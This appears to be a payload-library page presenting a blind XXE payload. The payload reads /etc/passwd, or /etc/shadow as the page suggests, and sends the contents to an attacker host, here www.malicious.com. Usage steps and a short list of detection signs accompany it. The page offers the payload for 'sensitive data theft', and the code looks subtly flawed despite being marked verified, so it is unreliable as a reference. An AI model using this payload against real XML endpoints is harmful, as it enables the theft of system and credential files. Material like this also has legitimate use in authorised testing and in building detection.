---
id: 60e2713a-b845-48b9-9710-4039b90ce4f9
name: Blind-XXE-Payload-for-File-Exfiltration
type: code
language: xml
verified: true
created_at: '2023-04-06T03:56:44.361594+00:00'
updated_at: '2023-04-10T20:24:38.784710+00:00'
platforms:
  - Web
  - Linux
tags:
  - xxe
  - file-read
  - exfiltration
  - payload
validated: true
---

# Blind-XXE-Payload-for-File-Exfiltration

## Code

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "file:///etc/passwd" >
<!ENTITY callhome SYSTEM "www.malicious.com/?%xxe;">
]>
<foo>&callhome;</foo>
```

## Description

This XML payload exploits blind XXE by defining a parameter entity (%xxe) that reads the contents of /etc/passwd using a file:// URI. It then embeds this entity in another external entity (callhome) that triggers an outbound HTTP request to an attacker-controlled server, exfiltrating the file contents via the query parameter. The encoding is set to ISO-8859-1 to handle potential character issues in file data.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| `file:///etc/passwd` | Local file path to read and exfiltrate | `file:///etc/shadow` (for other files) |
| `www.malicious.com` | Attacker-controlled domain to receive the exfiltrated data | `attacker.com` or Burp Collaborator URL |
| `?%xxe;` | Query parameter embedding the file contents | N/A (entity substitution) |

## Usage

Inject into vulnerable XML endpoints during web app testing. Replace the file path and domain as needed. Monitor the target server for the outbound request containing the file data. Used in procedures like [[procedures/Blind-XXE-Out-of-Band-Data-Exfiltration]] for sensitive data theft.

## Detection

- Application logs indicating file access attempts via XML parsing.
- Outbound HTTP requests with large or encoded query strings from the web server.
- IDS/IPS signatures for XXE patterns like 'file://' in XML or unusual external entity calls.

## Related

- [[procedures/Blind-XXE-Out-of-Band-Data-Exfiltration]]
